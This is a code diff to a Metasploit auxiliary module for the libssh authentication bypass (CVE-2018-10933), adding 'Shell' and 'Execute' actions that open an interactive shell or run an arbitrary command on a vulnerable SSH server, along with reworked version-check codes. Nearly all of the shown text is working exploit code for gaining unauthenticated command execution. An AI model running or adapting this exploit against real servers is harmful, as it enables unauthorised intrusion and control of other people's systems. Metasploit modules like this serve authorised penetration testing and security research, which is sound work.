@@ -35,12 +35,17 @@ class MetasploitModule < Msf::Auxiliary
         ['URL', 'https://www.libssh.org/security/advisories/CVE-2018-10933.txt']
       ],
       'DisclosureDate' => 'Oct 16 2018',
-      'License'        => MSF_LICENSE
+      'License'        => MSF_LICENSE,
+      'Actions'        => [
+        ['Shell',   'Description' => 'Spawn a shell'],
+        ['Execute', 'Description' => 'Execute a command']
+      ],
+      'DefaultAction'  => 'Shell'
     ))
 
     register_options([
       Opt::RPORT(22),
-      OptString.new('CMD',        [false, 'Command to execute']),
+      OptString.new('CMD',        [false, 'Command or alternative shell']),
       OptBool.new('SPAWN_PTY',    [false, 'Spawn a PTY', false]),
       OptBool.new('CHECK_BANNER', [false, 'Check banner for libssh', true])
     ])
@@ -57,21 +62,22 @@ class MetasploitModule < Msf::Auxiliary
 
     if v.nil?
       vprint_error("#{ip}:#{rport} - #{version} does not appear to be libssh")
-      return Exploit::CheckCode::Safe
+      Exploit::CheckCode::Unknown
     elsif v.between?(Gem::Version.new('0.6.0'), Gem::Version.new('0.7.5')) ||
           v.between?(Gem::Version.new('0.8.0'), Gem::Version.new('0.8.3'))
       vprint_good("#{ip}:#{rport} - #{version} appears to be unpatched")
-      return Exploit::CheckCode::Appears
+      Exploit::CheckCode::Appears
     else
       vprint_error("#{ip}:#{rport} - #{version} appears to be patched")
-      return Exploit::CheckCode::Safe
+      Exploit::CheckCode::Safe
     end
-
-    # Hopefully we never hit this
-    Exploit::CheckCode::Unknown
   end
 
   def run_host(ip)
+    if action.name == 'Execute' && datastore['CMD'].blank?
+      fail_with(Failure::BadConfig, 'Execute action requires CMD to be set')
+    end
+
     factory = ssh_socket_factory
 
     ssh_opts = {
@@ -124,7 +130,19 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    start_session(self, "#{self.name} (#{version})", {}, false, shell.lsock)
+    case action.name
+    when 'Shell'
+      start_session(self, "#{self.name} (#{version})", {}, false, shell.lsock)
+    when 'Execute'
+      output = shell.channel[:data].chomp
+
+      if output.blank?
+        print_error("Empty or blank output: #{datastore['CMD']}")
+        return
+      end
+
+      print_status("#{ip}:#{rport} - Executed: #{datastore['CMD']}\n#{output}")
+    end
   end
 
   def rport
